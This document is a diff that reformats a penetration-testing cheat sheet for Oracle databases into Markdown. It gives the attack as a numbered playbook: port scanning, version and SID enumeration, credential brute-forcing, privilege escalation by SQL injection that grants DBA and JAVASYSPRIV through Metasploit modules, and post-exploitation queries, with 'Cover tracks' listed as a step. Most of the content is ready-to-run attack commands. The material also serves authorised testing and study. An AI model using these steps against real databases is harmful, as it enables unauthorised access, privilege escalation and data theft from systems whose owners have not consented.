@@ -1,4 +1,4 @@
-Oracle
+# Oracle
 
 
 1. Locate a system running Oracle.
@@ -10,53 +10,83 @@ Oracle
 7. Cover tracks.
 ------------------------------------------------------------------------------------------------------
 
-1. nmap -Pn -n -T4 --open -p1521 <target IP>
+### 1. Locate a system running Oracle.
 
-2. Example 1
+```
+nmap -Pn -n -T4 --open -p1521 <target IP>
+```
+### 2. Determine Oracle version.
+
+   Example 1
+```
      msf > use auxiliary/scanner/oracle/tnslsnr_version
      db_notes
+```
 
    Example 2
+```
      tnscmd10g version -h <target IP>
      tnscmd10g status -h <target IP>
      Look for the version, LOGFILE, TRACING and PORT.
+```
 
-3. Example 1
+### 3. Determine Oracle SID.
+
+   Example 1
+```
      msf > use auxiliary/scanner/oracle/sid_enum
      msf > use auxiliary/admin/oracle/sid_brute
+```
 
    Example 2
-     sidguess -i <target IP> -d /usr/share/metasploit-framework/data/wordlists/sid.txt
-
+   
+```
+    sidguess -i <target IP> -d /usr/share/metasploit-framework/data/wordlists/sid.txt
+```
+   
    Example 3
-     http://<target IP>:8080/oradb/PUBLIC/GLOBAL_NAME
+   
+```
+       http://<target IP>:8080/oradb/PUBLIC/GLOBAL_NAME
+```
 
-4. Example 1
+
+### 4. Guess/Bruteforce USERNAME/PASS.
+
+   Example 1
+   ```
      msf > use auxiliary/admin/oracle/login_brute
      set SID <sid>
-
+   ```
    Example 2
-     sqlplus <username>/<password>@<target IP>:<port>/<SID>
+   ```
+       sqlplus <username>/<password>@<target IP>:<port>/<SID>
+```
 
-5. msf > use auxiliary/admin/oracle/sql
+### 5.Privilege escalation via SQL injection.
+ ```
+   msf > use auxiliary/admin/oracle/sql
    set DBUSER <user>
    set DBPASS <password>
    set SID <sid>
    set SQL select * from user_role_privs
-
+```
+```
    msf > use auxiliary/admin/oracle/pushin/lt_findricset_cursor
    set DBUSER <user>
    set DBPASS <password>
    set SID <sid>
    set SQL GRANT DBA TO <user>
    set SQL GRANT JAVASYSPRIV TO <user>
-
-6. select * from v$version;                  -- Oracle version
+```
+### 6. Manipulate data/post exploitation.
+```
+   select * from v$version;                  -- Oracle version
    select * from dba_registry_history;       -- Oracle patch level
    select * from all_users;                  -- usernames
    select owner,table_name from all_tables;  -- tables
    select * from session_roles;              -- session roles
    desc utl_http                             -- describes database objects
-
+```
 
 http://www.youtube.com/watch?v=SVvAvmjT7V4#t=1535
